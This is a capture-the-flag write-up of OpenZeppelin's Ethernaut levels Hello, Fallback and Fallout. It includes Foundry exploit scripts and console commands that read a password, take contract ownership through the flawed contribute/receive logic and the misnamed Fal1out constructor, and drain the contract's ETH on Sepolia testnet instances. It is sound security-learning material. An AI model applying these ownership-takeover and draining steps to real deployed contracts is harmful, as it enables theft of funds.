# Ethernaut WriteUps

Ethernaut is OpenZeppelin’s wargame to learn about Ethereum smart contract security.

I solved all these challenges using `foundry` framework in my local environment which made testing and solving the challenge easily.

- Make sure you have `foundry` installed locally.
- Check if you have foundry by running the command below.
```bash
forge --version
```
If you see a output like this
``` bash
forge 0.3.0 (5a8bd89 2024-12-20T08:45:53.204298000Z)
```
Then you are good to go...

### **Step 1: Set Up the Solution Script**
1. Navigate to your Foundry project.
2. Inside the **`script/`** folder, create a solution file (e.g., `ChallengeSolution.s.sol`).
3. Your script should:
   - **Interact with the instance contract** using its address.
   - **Execute the exploit** (e.g., calling functions, sending ETH, or manipulating storage).
   - **Verify that the exploit was successful**.

### **Step 2: Load Environment Variables**
Before running the script, ensure your **`.env`** file is correctly formatted:
```ini
PRIVATE_KEY=your_private_key
INFURA_URL=https://eth-sepolia.g.alchemy.com/v2/YOUR_INFURA_KEY
MY_ADDRESS=your_wallet_address
```
Then, load the environment variables:

```ini
source .env
```

### **Step 3: Execute the Script on Sepolia**
To execute your solution on the Sepolia network, run:

```ini
forge script script/ChallengeSolution.s.sol --rpc-url $INFURA_URL --broadcast
```

-	This interacts directly with Sepolia, executing your exploit.
-	If successful, your contract should be hacked or manipulated as required.

---
---

# Challenges

## 0. Hello
The first challenge gets you accustomed to the usual way each challenge needs to be set up. Using the Chrome developer tools you can see the level address that will be used to create a challenge contract instance for you. You can call `contract.abi` in the console to see the available functions to call on the contract. After calling the various `info` functions you receive a hint that you need to call the `authenticate` function with a password to pass this level. The password can be retrieved by the `password()` function and is `ethernaut0`.

This is the solution script `script/Level0Solutiions.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level0.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level0Solution is Script {
    
    Level0 public level0 = Level0(0x9C27364c0C4C0bFCAF0A671e4b2D898D687CBd8e);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); // Use the private key that deployed your Ethernaut instance
        
        string memory pass = level0.password(); // Read the password directly
        console.log("Extracted Password:", pass);
        
        level0.authenticate(pass); // Authenticate using the extracted password

        bool cleared = level0.getCleared();
        require(cleared, "Authentication failed!");
        console.log("Success! Level cleared.");

        vm.stopBroadcast();
    }
}
```

---
---

## 1. Fallback

The goal of this challenge is to :
1. Claim ownership of the contract.
2. Drain it's ETH.

So we should find a loophole to be the owner of this contract.

In the `contribute()` function the `owner` is set the `msg.sender`. To achieve the ` owner = msg.sender;` two conditions should be met:
1. `require(msg.value < 0.001 ether)`
2. `if (contributions[msg.sender] > contributions[owner])`

So, call the contribute function with some ETH (even 1 wei works) `contribute{value: 1 wei}()` and then, to increase the contributions do `address(fallbackIns).call{value: 1 wei}("")` this calls the receive() function. Once receive() is called with `msg.value > 0 && contributions[msg.sender] > 0` then the `owner` becomes the `msg.sender`.

For the second goal `Drain it's ETH` => Since you became the owner, just call the withdraw() function which drain all the ETH. And that's it the challenge has completed :)

This is the solution script `script/FallbackSolution.s.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    
    Fallback public fallbackIns = Fallback(payable(0x4c949eF7B0BeBd67aDCaf8c0bB99af0908fCD0BC));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackIns.contribute{value: 1 wei}(); // Call the contribute function with some wei
        (bool success, ) = address(fallbackIns).call{value: 1 wei}("");
        require(success, "Transaction failed");
        console.log("New Owner: ", fallbackIns.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));
        fallbackIns.withdraw(); // Drain the contract's ETH by calling the withdraw function.

        vm.stopBroadcast();
    }
}
```

---
---
## 2. Fallout

The goal of this challenge is claim ownership of the contract. (As simple as that). Think as a hackers mindset, How can i claim the ownership of this contract? Is there any loopholes ???

This challenge uses the older version of the solidity compiler i.e, `pragma solidity ^0.6.0`.

In the older versions there is no specific constructor keyword. So the constructor is used as the contract's name itself in this case it's `Fallout`.

The contract’s constructor sets the owner as the msg.sender upon deployment.

Upon closer inspection, we discover that the `“so-called constructor”` in the Fallout smart contract is not a constructor. It is just a public payable function with a different name `“Fal1out”` (with 1 instead of l), and this function will not be automatically triggered upon contract deployment. Due to this, the owner remains set to address zero, and anyone can call this function to update the owner.

### Exploiting the Vulnerability
All we need to do is call the public `Fal1out()` function and it will update the owner variable with our address. Let’s solve it with Foundry.

First, we will create in the src\ folder the Fallout.sol contract and paste the original contract code:

Then we will create a new file inside the `script\` folder called `FalloutSolution.s.sol`

`FalloutSolution.s.sol`
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Objective
// 1. Claim the ownership of the contract.

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallout.sol";

contract FalloutSolution is Script {

    Fallout public fallout = Fallout(payable(0x762e68df2BdBE79f8d8e18E1c5bd33816181e9C5));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner Before: ", fallout.owner());

        fallout.Fal1out();

        console.log("Owner After: ", fallout.owner());
        vm.stopBroadcast();
    }

}
```

Now that the exploit script is ready, we can execute from our terminal the following command: `forge script script/FalloutSolution.s.sol --rpc-url $INFURA_URL --broadcast`

---

### **Ethernaut Fallout Challenge - Easy Console Method**

### **📌 Solving via Console**
There is an **easier way** to solve this challenge directly from the **console**.

---

**1️⃣ Open Console & Get the Instance**
First, open the **console** and retrieve the contract instance.

You can check the **player's address** by running:
```javascript
player
'0xa8CFB5E2DF0C1B5232227a0bD15E745c7Acc5585'
```

And importantly the command `contract.abi` gives all the available function for this contract.

2️⃣ To see all available functions, use:
![contract.abi image](assets/img.png)

3️⃣ Exploit the Faulty Constructor

The contract has a misnamed constructor (Fal1out instead of Fallout).
Since Solidity only recognizes constructors if they match the contract name exactly, Fal1out() is treated as a regular public function.
don't forget to use the keyword `await` as the function returns a promise.

You can call it using:

```javascript
await contract.Fal1out()
```

![contract.Fal1out image](assets/fallout-img2.png)

Once the transaction is confirmed, submit the instance to complete the challenge!

![Well done image](assets/fallout-img3.png)

---
